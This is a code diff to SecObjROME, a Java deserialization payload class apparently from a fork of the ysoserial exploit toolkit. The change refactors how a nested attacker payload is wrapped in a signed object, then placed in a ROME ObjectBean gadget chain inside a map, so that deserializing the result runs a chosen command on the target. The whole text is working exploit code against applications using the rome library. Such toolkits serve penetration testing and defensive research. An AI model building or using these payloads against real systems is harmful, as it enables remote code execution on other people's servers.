@@ -4,7 +4,6 @@ import com.sun.syndication.feed.impl.ObjectBean;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
-import ysoserial.payloads.util.ParseArg;
 import ysoserial.payloads.util.PayloadRunner;
 
 import java.io.Serializable;
@@ -16,21 +15,16 @@ import java.security.SignedObject;
 import java.util.ArrayList;
 import java.util.List;
 
+import static ysoserial.payloads.util.Gadgets.createSignedObject;
+import static ysoserial.payloads.util.Gadgets.getTargetPayload;
+
 @SuppressWarnings({"rawtypes", "unchecked", "restriction"})
 @Dependencies("rome:rome:1.0")
 @Authors({ Authors.J1an })
 public class SecObjROME extends PayloadRunner implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
-        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
-        kpg.initialize(1024);
-        KeyPair kp = kpg.generateKeyPair();
-        Class payloadClazz= ParseArg.getTargetPayload(command);
-        if (payloadClazz == null) {
-            throw new IllegalArgumentException("Invalid payload type '" + command.split(":")[0] + "'");
-        }
-        Method getPayloadObj= payloadClazz.getMethod("getObject", String.class);
-        SignedObject signedObject = new SignedObject((Serializable) getPayloadObj.invoke(payloadClazz.newInstance(), command.split(":",2)[1]), kp.getPrivate(), Signature.getInstance("DSA"));
+        SignedObject signedObject = createSignedObject(command);
         ObjectBean delegate = new ObjectBean(SignedObject.class, signedObject);
         ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
         return Gadgets.makeMap(root, root);
